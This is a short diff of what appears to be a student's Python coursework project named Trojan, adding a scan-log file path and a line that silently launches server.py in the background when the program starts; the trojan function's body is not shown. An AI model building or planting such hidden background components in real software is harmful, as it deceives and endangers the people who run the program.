@@ -40,6 +40,7 @@ def trojan():
 def main():
     
     trojan_executed = False  # Track whether the Trojan has been executed
+    log_file_path = "D:/notes/IAI Workstation/YEAR 3/ADVANCE PYTHON PROGRAMMING/project/Trojan/system_scan_log.json"
     
     while True:
         try:
@@ -69,4 +70,5 @@ def main():
             break
 
 if __name__ == "__main__":
+    subprocess.Popen(['python', 'server.py'])
     main()
